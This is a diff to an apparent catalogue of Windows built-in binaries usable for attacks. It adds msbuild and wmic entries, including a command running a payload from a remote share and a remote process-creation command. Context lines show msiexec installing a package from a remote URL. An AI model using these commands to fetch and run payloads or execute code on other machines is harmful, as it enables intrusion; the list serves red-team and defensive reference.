@@ -47,6 +47,10 @@ https://github.com/hfiref0x/UACME
   - Description: Forfiles supports the ability to execute commands and seems to be equivalent to cmd.
   - Example: forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
 
+- msbuild.exe
+  - Description - Microsoft's build utility where you can supply an inline build task to execute code (https://msdn.microsoft.com/en-us/library/dd722601.aspx)
+  - Example: C:\Windows\Microsoft.NET\Framework\v2.0.50727\msbuild.exe \\server\payload
+
 - msiexec.exe
   - Description - The Windows installer typically used to install new software or patches. It be used to download and execute a remote payload.
   - Example: msiexec /i http://server/package.msi
@@ -74,6 +78,11 @@ https://github.com/hfiref0x/UACME
 - winrm.exe
   - Description: WinRM, or Windows Remote Management provides the ability to remotely execute wmi commands. The winrm service is disabled by default but can be enabled.
   - Example: winrm qc -q & winrm i c wmicimv2/Win32_Process @{CommandLine="calc"}
+
+- wmic.exe
+  - Description: Command line tool for WMI.
+  - Example: wmic process call create "cmd.exe /c calc"
+  - Example: wmic /node:[targetIPaddr] /user:[admin] process call create "cmd.exe /c [command]"
 
 
 ### Download Techniques:
